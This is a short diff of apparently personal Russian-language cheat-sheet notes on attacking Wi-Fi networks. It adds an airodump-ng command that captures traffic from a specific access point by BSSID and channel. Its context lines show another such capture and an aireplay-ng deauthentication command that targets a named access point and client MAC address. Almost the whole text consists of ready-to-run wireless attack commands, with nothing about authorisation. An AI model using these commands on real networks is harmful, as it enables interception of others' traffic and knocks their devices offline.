@@ -41,7 +41,9 @@ iw dev
 # прослушивание конкретной сети
 
     sudo airodump-ng --bssid C4:6E:1F:71:EC:16 --channel 1 -w test wlan1mon
+    sudo airodump-ng -c1 --bssid D8:D6:3D:EB:29:D5 -w capture wlan0mon
 
+    
 # деауз
 
     sudo aireplay-ng --deauth 10 -a C4:6E:1F:71:EC:16 -c 32:B8:F4:5F:FB:65 wlan1
